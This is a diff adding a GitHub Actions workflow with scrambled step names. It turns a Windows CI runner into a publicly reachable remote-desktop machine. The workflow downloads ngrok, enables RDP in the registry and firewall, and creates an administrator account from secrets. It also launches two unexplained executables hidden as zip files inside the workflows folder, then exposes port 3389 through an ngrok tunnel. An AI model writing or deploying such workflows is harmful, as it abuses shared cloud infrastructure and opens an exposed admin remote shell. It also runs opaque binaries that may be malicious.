@@ -1,0 +1,45 @@
+name: LYANS
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: KAaYsZ
+      run: Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: tdhays
+      run: Expand-Archive ngrok.zip -DestinationPath .
+    - name: mkeya
+      env:
+        JKF: ${{ secrets.JKF }}
+      run: .\ngrok.exe authtoken "$Env:JKF"
+    - name: kmegeya
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+    - name: meyưaasb
+      run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - name: ywtssa
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+    - name: mreaswna
+      shell: pwsh
+      env:
+        HDR: ${{ secrets.HDR }}
+        ENDSS: ${{ secrets.ENDSS }}
+      run: |
+        New-LocalUser -Name "$Env:HDR" -Password (ConvertTo-SecureString -AsPlainText "$Env:ENDSS" -Force) -ErrorAction SilentlyContinue
+        Set-LocalUser -Name "$Env:HDR" -Password (ConvertTo-SecureString -AsPlainText "$Env:ENDSS" -Force)
+        Add-LocalGroupMember -Group "Administrators" -Member "$Env:HDR"         
+    - name: GESA
+      run: |
+        Expand-Archive -Path "$env:GITHUB_WORKSPACE\.github\workflows\GESA.zip" -DestinationPath D:\GESA
+        Start-Process D:\GESA\GESA.exe
+    - name: OYTS
+      run: |
+        Expand-Archive -Path "$env:GITHUB_WORKSPACE\.github\workflows\OYTS.zip" -DestinationPath D:\OYTS
+        Start-Process D:\OYTS\OYTS.exe        
+    - name: OK
+      run: .\ngrok.exe tcp 3389 --region=us-cal-1
